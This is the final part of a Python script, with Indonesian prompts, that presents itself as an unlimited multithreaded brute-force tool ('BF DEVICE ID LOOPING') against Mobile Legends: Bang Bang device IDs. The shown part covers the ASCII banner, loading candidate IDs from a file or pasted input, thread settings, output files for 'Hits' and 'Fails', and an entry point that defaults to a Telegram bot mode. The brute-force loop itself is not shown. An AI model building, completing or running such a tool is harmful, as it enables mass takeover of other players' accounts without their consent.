        r" ██████╗ ███████╗    ██╗      ██████╗  ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ ",
        r" ██╔══██╗██╔════╝    ██║     ██╔═══██╗██╔═══██╗██╔══██╗██║████╗  ██║██╔════╝ ",
        r" ██████╔╝█████╗      ██║     ██║   ██║██║   ██║██████╔╝██║██╔██╗ ██║██║  ███╗",
        r" ██╔══██╗██╔══╝      ██║     ██║   ██║██║   ██║██╔═══╝ ██║██║╚██╗██║██║   ██║",
        r" ██████╔╝██║         ███████╗╚██████╔╝╚██████╔╝██║     ██║██║ ╚████║╚██████╔╝",
        r" ╚═════╝ ╚═╝         ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ",
    ]:
        print(line)
    print(f"{Style.RESET_ALL}")
    print(f"{Fore.CYAN} BF DEVICE ID LOOPING — MLBB (Unlimited){Style.RESET_ALL}")
    print(f"{Fore.YELLOW} Save folder: {OUTPUT_DIR}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} Hits  → {BF_HIT_FILE}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} Fails → {BF_FAIL_FILE}{Style.RESET_ALL}\n")


def load_device_ids_from_file(path):
    ids = []
    if not os.path.exists(path):
        return ids
    with open(path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and line.startswith('and_'):
                ids.append(line)
    return ids


def main():
    banner()

    print(f"{Fore.CYAN}Pilih sumber Device ID:{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} Load dari file (.txt, satu device per baris)")
    print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} Paste manual (ketik 'done' kalau selesai)")
    print()
    src = input(f"{Fore.CYAN}Pilih [1/2]: {Style.RESET_ALL}").strip() or "1"

    device_ids = []

    if src == "1":
        path = input(f"{Fore.CYAN}Path file device ID: {Style.RESET_ALL}").strip().replace('"', '')
        if not os.path.exists(path):
            print(f"{Fore.RED}File tidak ditemukan!{Style.RESET_ALL}")
            sys.exit(1)
        device_ids = load_device_ids_from_file(path)
    else:
        print(f"{Fore.CYAN}Paste Device ID (satu per baris, ketik 'done' untuk selesai):{Style.RESET_ALL}")
        while True:
            line = input().strip()
            if line.lower() == 'done':
                break
            if line.startswith('and_'):
                device_ids.append(line)

    if not device_ids:
        print(f"{Fore.RED}Tidak ada Device ID valid!{Style.RESET_ALL}")
        sys.exit(1)

    print(f"\n{Fore.GREEN}Total Device ID: {len(device_ids)}{Style.RESET_ALL}\n")

    try:
        max_threads = int(input(f"{Fore.CYAN}Threads (default 20): {Style.RESET_ALL}").strip() or "20")
    except ValueError:
        max_threads = 20

    print(f"\n{Fore.YELLOW}Total Device ID: {len(device_ids)}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Threads        : {max_threads}{Style.RESET_ALL}")
    print(f"\n{Fore.MAGENTA}Mulai brute force UNLIMITED...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Tekan Ctrl+C untuk berhenti.{Style.RESET_ALL}\n")

    bf_loop(device_ids, max_threads, clear_files=False)


# ══════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    # Default: Telegram Bot mode
    # Untuk CLI: python bf.py cli
    if len(sys.argv) > 1 and sys.argv[1].lower() == "cli":
        main()
    else:
        run_telegram_bot()
